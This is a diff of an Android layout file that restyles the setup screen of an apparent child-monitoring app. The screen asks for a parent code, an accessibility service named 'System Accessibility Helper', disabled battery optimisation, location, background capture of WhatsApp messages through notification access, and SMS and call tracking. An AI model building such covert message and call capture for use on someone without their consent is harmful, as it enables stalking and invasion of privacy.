@@ -3,47 +3,48 @@
     xmlns:app="http://schemas.android.com/apk/res-auto"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:background="#F8F8F8">
+    android:background="#0F0F0F">
 
     <LinearLayout
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
         android:orientation="vertical"
-        android:padding="24dp">
+        android:padding="20dp">
 
         <!-- Header -->
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="Device Setup"
-            android:textSize="28sp"
+            android:text="🛡 Child Setup"
+            android:textSize="26sp"
             android:textStyle="bold"
-            android:textColor="#1A1A1A"
-            android:layout_marginTop="32dp"/>
+            android:textColor="#FFFFFF"
+            android:layout_marginTop="24dp"/>
 
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
             android:text="Complete all steps to activate monitoring"
-            android:textSize="14sp"
-            android:textColor="#6B6B6B"
-            android:layout_marginTop="6dp"
-            android:layout_marginBottom="32dp"/>
+            android:textSize="13sp"
+            android:textColor="#8A8A8A"
+            android:layout_marginTop="4dp"
+            android:layout_marginBottom="24dp"/>
 
         <!-- Step 1: Parent ID -->
         <com.google.android.material.card.MaterialCardView
             android:id="@+id/cardParentId"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginBottom="16dp"
-            app:cardCornerRadius="12dp"
-            app:cardElevation="2dp">
+            android:layout_marginBottom="12dp"
+            app:cardCornerRadius="14dp"
+            app:cardElevation="0dp"
+            app:cardBackgroundColor="#1E1E1E">
 
             <LinearLayout
                 android:layout_width="match_parent"
                 android:layout_height="wrap_content"
                 android:orientation="vertical"
-                android:padding="20dp">
+                android:padding="18dp">
 
                 <LinearLayout
                     android:layout_width="match_parent"
@@ -55,46 +56,48 @@
                         android:layout_width="0dp"
                         android:layout_height="wrap_content"
                         android:layout_weight="1"
-                        android:text="Step 1 — Parent ID"
-                        android:textSize="16sp"
+                        android:text="Step 1 — Parent Code"
+                        android:textSize="15sp"
                         android:textStyle="bold"
-                        android:textColor="#1A1A1A"/>
+                        android:textColor="#FFFFFF"/>
 
                     <TextView
                         android:id="@+id/tvStep1Status"
                         android:layout_width="wrap_content"
                         android:layout_height="wrap_content"
                         android:text="⬜ Pending"
-                        android:textSize="13sp"
-                        android:textColor="#6B6B6B"/>
+                        android:textSize="12sp"
+                        android:textColor="#757575"/>
                 </LinearLayout>
 
                 <TextView
                     android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
-                    android:text="Enter the ID provided by the parent app"
-                    android:textSize="13sp"
-                    android:textColor="#6B6B6B"
+                    android:text="Enter the code from the parent's phone"
+                    android:textSize="12sp"
+                    android:textColor="#8A8A8A"
                     android:layout_marginTop="4dp"
                     android:layout_marginBottom="12dp"/>
 
                 <EditText
                     android:id="@+id/etParentId"
                     android:layout_width="match_parent"
-                    android:layout_height="wrap_content"
-                    android:hint="Enter Parent ID"
+                    android:layout_height="46dp"
+                    android:hint="Enter Parent Code"
+                    android:textColorHint="#555555"
+                    android:textColor="#FFFFFF"
                     android:textSize="14sp"
                     android:padding="12dp"
-                    android:background="@drawable/bg_input"
-                    android:inputType="text"/>
+                    android:background="@drawable/bg_input_dark"
+                    android:inputType="textCapCharacters"/>
 
                 <Button
                     android:id="@+id/btnSaveParentId"
                     android:layout_width="match_parent"
-                    android:layout_height="48dp"
+                    android:layout_height="46dp"
                     android:layout_marginTop="12dp"
                     android:text="Save ID"
-                    android:backgroundTint="#1A1A1A"
+                    android:backgroundTint="#4DA6FF"
                     android:textColor="#FFFFFF"/>
 
             </LinearLayout>
@@ -102,18 +105,18 @@
 
         <!-- Step 2: Accessibility -->
         <com.google.android.material.card.MaterialCardView
-            android:id="@+id/cardAccessibility"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginBottom="16dp"
-            app:cardCornerRadius="12dp"
-            app:cardElevation="2dp">
+            android:layout_marginBottom="12dp"
+            app:cardCornerRadius="14dp"
+            app:cardElevation="0dp"
+            app:cardBackgroundColor="#1E1E1E">
 
             <LinearLayout
                 android:layout_width="match_parent"
                 android:layout_height="wrap_content"
                 android:orientation="vertical"
-                android:padding="20dp">
+                android:padding="18dp">
 
                 <LinearLayout
                     android:layout_width="match_parent"
@@ -126,53 +129,52 @@
                         android:layout_height="wrap_content"
                         android:layout_weight="1"
                         android:text="Step 2 — Accessibility"
-                        android:textSize="16sp"
+                        android:textSize="15sp"
                         android:textStyle="bold"
-                        android:textColor="#1A1A1A"/>
+                        android:textColor="#FFFFFF"/>
 
                     <TextView
                         android:id="@+id/tvStep2Status"
                         android:layout_width="wrap_content"
                         android:layout_height="wrap_content"
                         android:text="⬜ Pending"
-                        android:textSize="13sp"
-                        android:textColor="#6B6B6B"/>
+                        android:textSize="12sp"
+                        android:textColor="#757575"/>
                 </LinearLayout>
 
                 <TextView
                     android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
-                    android:text="Enable System Accessibility Helper in settings"
-                    android:textSize="13sp"
-                    android:textColor="#6B6B6B"
+                    android:text="Enable System Accessibility Helper"
+                    android:textSize="12sp"
+                    android:textColor="#8A8A8A"
                     android:layout_marginTop="4dp"
                     android:layout_marginBottom="12dp"/>
 
                 <Button
                     android:id="@+id/btnEnableAccessibility"
                     android:layout_width="match_parent"
-                    android:layout_height="48dp"
+                    android:layout_height="46dp"
                     android:text="Open Accessibility Settings"
-                    android:backgroundTint="#1A1A1A"
+                    android:backgroundTint="#2A2A2A"
                     android:textColor="#FFFFFF"/>
-
             </LinearLayout>
         </com.google.android.material.card.MaterialCardView>
 
         <!-- Step 3: Battery -->
         <com.google.android.material.card.MaterialCardView
-            android:id="@+id/cardBattery"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginBottom="16dp"
-            app:cardCornerRadius="12dp"
-            app:cardElevation="2dp">
+            android:layout_marginBottom="12dp"
+            app:cardCornerRadius="14dp"
+            app:cardElevation="0dp"
+            app:cardBackgroundColor="#1E1E1E">
 
             <LinearLayout
                 android:layout_width="match_parent"
                 android:layout_height="wrap_content"
                 android:orientation="vertical"
-                android:padding="20dp">
+                android:padding="18dp">
 
                 <LinearLayout
                     android:layout_width="match_parent"
@@ -185,53 +187,52 @@
                         android:layout_height="wrap_content"
                         android:layout_weight="1"
                         android:text="Step 3 — Battery"
-                        android:textSize="16sp"
+                        android:textSize="15sp"
                         android:textStyle="bold"
-                        android:textColor="#1A1A1A"/>
+                        android:textColor="#FFFFFF"/>
 
                     <TextView
                         android:id="@+id/tvStep3Status"
                         android:layout_width="wrap_content"
                         android:layout_height="wrap_content"
                         android:text="⬜ Pending"
-                        android:textSize="13sp"
-                        android:textColor="#6B6B6B"/>
+                        android:textSize="12sp"
+                        android:textColor="#757575"/>
                 </LinearLayout>
 
                 <TextView
                     android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
-                    android:text="Disable battery optimization so the service runs 24/7"
-                    android:textSize="13sp"
-                    android:textColor="#6B6B6B"
+                    android:text="Disable battery optimization for 24/7 monitoring"
+                    android:textSize="12sp"
+                    android:textColor="#8A8A8A"
                     android:layout_marginTop="4dp"
                     android:layout_marginBottom="12dp"/>
 
                 <Button
                     android:id="@+id/btnBatteryOptimization"
                     android:layout_width="match_parent"
-                    android:layout_height="48dp"
+                    android:layout_height="46dp"
                     android:text="Disable Battery Optimization"
-                    android:backgroundTint="#1A1A1A"
+                    android:backgroundTint="#2A2A2A"
                     android:textColor="#FFFFFF"/>
-
             </LinearLayout>
         </com.google.android.material.card.MaterialCardView>
 
-        <!-- Step 4: Location Tracking -->
+        <!-- Step 4: Location -->
         <com.google.android.material.card.MaterialCardView
-            android:id="@+id/cardLocation"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginBottom="16dp"
-            app:cardCornerRadius="12dp"
-            app:cardElevation="2dp">
+            android:layout_marginBottom="12dp"
+            app:cardCornerRadius="14dp"
+            app:cardElevation="0dp"
+            app:cardBackgroundColor="#1E1E1E">
 
             <LinearLayout
                 android:layout_width="match_parent"
                 android:layout_height="wrap_content"
                 android:orientation="vertical"
-                android:padding="20dp">
+                android:padding="18dp">
 
                 <LinearLayout
                     android:layout_width="match_parent"
@@ -243,54 +244,53 @@
                         android:layout_width="0dp"
                         android:layout_height="wrap_content"
                         android:layout_weight="1"
-                        android:text="Step 4 — Location Permission"
-                        android:textSize="16sp"
+                        android:text="Step 4 — Location"
+                        android:textSize="15sp"
                         android:textStyle="bold"
-                        android:textColor="#1A1A1A"/>
+                        android:textColor="#FFFFFF"/>
 
                     <TextView
                         android:id="@+id/tvStep4Status"
                         android:layout_width="wrap_content"
                         android:layout_height="wrap_content"
                         android:text="⬜ Pending"
-                        android:textSize="13sp"
-                        android:textColor="#6B6B6B"/>
+                        android:textSize="12sp"
+                        android:textColor="#757575"/>
                 </LinearLayout>
 
                 <TextView
                     android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
-                    android:text="Grant location permissions to share coordinates in emergencies"
-                    android:textSize="13sp"
-                    android:textColor="#6B6B6B"
+                    android:text="Share location for emergency tracking"
+                    android:textSize="12sp"
+                    android:textColor="#8A8A8A"
                     android:layout_marginTop="4dp"
                     android:layout_marginBottom="12dp"/>
 
                 <Button
                     android:id="@+id/btnEnableLocation"
                     android:layout_width="match_parent"
-                    android:layout_height="48dp"
+                    android:layout_height="46dp"
                     android:text="Grant Location Access"
-                    android:backgroundTint="#1A1A1A"
+                    android:backgroundTint="#2A2A2A"
                     android:textColor="#FFFFFF"/>
-
             </LinearLayout>
         </com.google.android.material.card.MaterialCardView>
 
-        <!-- Step 5: Notification Access -->
+        <!-- Step 5: Notification -->
         <com.google.android.material.card.MaterialCardView
-            android:id="@+id/cardNotification"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginBottom="16dp"
-            app:cardCornerRadius="12dp"
-            app:cardElevation="2dp">
+            android:layout_marginBottom="12dp"
+            app:cardCornerRadius="14dp"
+            app:cardElevation="0dp"
+            app:cardBackgroundColor="#1E1E1E">
 
             <LinearLayout
                 android:layout_width="match_parent"
                 android:layout_height="wrap_content"
                 android:orientation="vertical"
-                android:padding="20dp">
+                android:padding="18dp">
 
                 <LinearLayout
                     android:layout_width="match_parent"
@@ -303,53 +303,52 @@
                         android:layout_height="wrap_content"
                         android:layout_weight="1"
                         android:text="Step 5 — Notification Access"
-                        android:textSize="16sp"
+                        android:textSize="15sp"
                         android:textStyle="bold"
-                        android:textColor="#1A1A1A"/>
+                        android:textColor="#FFFFFF"/>
 
                     <TextView
                         android:id="@+id/tvStep5Status"
                         android:layout_width="wrap_content"
                         android:layout_height="wrap_content"
                         android:text="⬜ Pending"
-                        android:textSize="13sp"
-                        android:textColor="#6B6B6B"/>
+                        android:textSize="12sp"
+                        android:textColor="#757575"/>
                 </LinearLayout>
 
                 <TextView
                     android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
-                    android:text="Enable Notification Access to capture messages in background"
-                    android:textSize="13sp"
-                    android:textColor="#6B6B6B"
+                    android:text="Capture WhatsApp messages in background"
+                    android:textSize="12sp"
+                    android:textColor="#8A8A8A"
                     android:layout_marginTop="4dp"
                     android:layout_marginBottom="12dp"/>
 
                 <Button
                     android:id="@+id/btnEnableNotification"
                     android:layout_width="match_parent"
-                    android:layout_height="48dp"
+                    android:layout_height="46dp"
                     android:text="Grant Notification Access"
-                    android:backgroundTint="#1A1A1A"
+                    android:backgroundTint="#2A2A2A"
                     android:textColor="#FFFFFF"/>
-
             </LinearLayout>
         </com.google.android.material.card.MaterialCardView>
 
-        <!-- Step 6: SMS & Calls Permission -->
+        <!-- Step 6: SMS & Calls -->
         <com.google.android.material.card.MaterialCardView
-            android:id="@+id/cardSmsCalls"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginBottom="16dp"
-            app:cardCornerRadius="12dp"
-            app:cardElevation="2dp">
+            android:layout_marginBottom="12dp"
+            app:cardCornerRadius="14dp"
+            app:cardElevation="0dp"
+            app:cardBackgroundColor="#1E1E1E">
 
             <LinearLayout
                 android:layout_width="match_parent"
                 android:layout_height="wrap_content"
                 android:orientation="vertical"
-                android:padding="20dp">
+                android:padding="18dp">
 
                 <LinearLayout
                     android:layout_width="match_parent"
@@ -361,37 +360,36 @@
                         android:layout_width="0dp"
                         android:layout_height="wrap_content"
                         android:layout_weight="1"
-                        android:text="Step 6 — SMS &amp; Calls Monitor"
-                        android:textSize="16sp"
+                        android:text="Step 6 — SMS &amp; Calls"
+                        android:textSize="15sp"
                         android:textStyle="bold"
-                        android:textColor="#1A1A1A"/>
+                        android:textColor="#FFFFFF"/>
 
                     <TextView
                         android:id="@+id/tvStep6Status"
                         android:layout_width="wrap_content"
                         android:layout_height="wrap_content"
                         android:text="⬜ Pending"
-                        android:textSize="13sp"
-                        android:textColor="#6B6B6B"/>
+                        android:textSize="12sp"
+                        android:textColor="#757575"/>
                 </LinearLayout>
 
                 <TextView
                     android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
-                    android:text="Allow app to track incoming SMS messages and calls"
-                    android:textSize="13sp"
-                    android:textColor="#6B6B6B"
+                    android:text="Track incoming SMS and phone calls"
+                    android:textSize="12sp"
+                    android:textColor="#8A8A8A"
                     android:layout_marginTop="4dp"
                     android:layout_marginBottom="12dp"/>
 
                 <Button
                     android:id="@+id/btnEnableSmsCalls"
                     android:layout_width="match_parent"
-                    android:layout_height="48dp"
+                    android:layout_height="46dp"
                     android:text="Grant SMS &amp; Call Access"
-                    android:backgroundTint="#1A1A1A"
+                    android:backgroundTint="#2A2A2A"
                     android:textColor="#FFFFFF"/>
-
             </LinearLayout>
         </com.google.android.material.card.MaterialCardView>
 
@@ -400,8 +398,10 @@
             android:id="@+id/cardStatus"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginTop="8dp"
-            app:cardCornerRadius="12dp"
+            android:layout_marginTop="4dp"
+            android:layout_marginBottom="24dp"
+            app:cardCornerRadius="14dp"
+            app:cardElevation="0dp"
             app:cardBackgroundColor="#1A1A1A">
 
             <LinearLayout
@@ -416,7 +416,7 @@
                     android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
                     android:text="⚠ Setup Incomplete"
-                    android:textSize="16sp"
+                    android:textSize="15sp"
                     android:textStyle="bold"
                     android:textColor="#FFFFFF"/>
 
@@ -424,9 +424,9 @@
                     android:id="@+id/tvFinalSubtext"
                     android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
-                    android:text="Complete all 5 steps above"
-                    android:textSize="13sp"
-                    android:textColor="#A0A0A0"
+                    android:text="Complete all 6 steps above"
+                    android:textSize="12sp"
+                    android:textColor="#8A8A8A"
                     android:layout_marginTop="4dp"/>
 
             </LinearLayout>
